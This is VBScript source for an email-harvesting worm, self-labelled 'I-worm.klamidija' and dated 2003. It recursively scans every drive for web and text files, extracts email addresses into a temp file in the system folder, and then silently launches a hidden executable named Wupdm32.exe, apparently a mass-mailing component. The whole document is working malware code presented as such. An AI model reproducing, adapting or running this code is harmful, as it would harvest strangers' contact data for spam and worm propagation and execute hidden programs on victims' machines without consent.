'I-worm.klamidija coded by AcidCooKie / serbia / nov.2003
on error resume next
Const ForReading = 1, ForWriting = 2, ForAppending = 3
Const TristateUseDefault = -2, TristateTrue = -1, TristateFalse = 0

Dim Sveadrese
Dim FSO
Set fso = CreateObject( "Scripting.FileSystemObject" )

Set Drives=fso.drives
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next

Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files 
If fso.GetExtensionName(file.path)="asp" or fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="txt" then
	Dim file	
	set file = FSO.GetFile(file.path)

	Dim FileSize
	FileSize = file.Size

	Dim TextStream
	Set TextStream = file.OpenAsTextStream(ForReading, TristateUseDefault)

	' Read the file line by line
	Do While Not TextStream.AtEndOfStream
		Dim Line
		Line = Trim(TextStream.readline)
		mesto2 = Instr(Line, "@")
		if mesto2 > 1 and len(Line) > mesto2 then
		if instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 - 1 ,1)) <> 0 and instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-",mid(Line,mesto2 + 1 ,1)) <> 0 then
		for i = 1 to mesto2 - 1
			if  mid(Line,mesto2 - i, 1)="" or mid(Line,mesto2 - i, 1)=vblf or mid(Line,mesto2 - i, 1)=vbcr or mid(Line,mesto2 - i, 1)=vbcrlf then
			mesto1 = mesto2 - i
			Exit For
			elseif InstrRev("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 - i, 1)) = 0 then
			mesto1 = mesto2 - i
			Exit For
			end if
		Next
		for i = 1 to len(Line) - mesto2
			if Instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 + i, 1)) = 0 then
			mesto3 = i - 1
			Exit For
			end if	
			if i = len(Line) - mesto2 then
			mesto3 = i
			Exit For
			end if
			mesto3 = mesto2 + i		
		Next
		email = Mid(Line, mesto1 + 1, mesto3 + (mesto2 - mesto1))
	        if email > "" then Sveadrese = Sveadrese + vbcrlf +  email
		mesto1=0
		mesto2=0
		mesto3=0
		end if
		end if
		Loop

	Set TextStream = nothing
	end if
Next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function

Set Script = Fso.CreateTextFile(fso.GetSpecialFolder(1) & "\emls.tmp", True)
Script.Write Sveadrese
Script.Close

Dim wsh
Set wsh = CreateObject("Wscript.shell")
wsh.Run(fso.GetSpecialFolder(0) & "\Wupdm32.exe"), vbHide

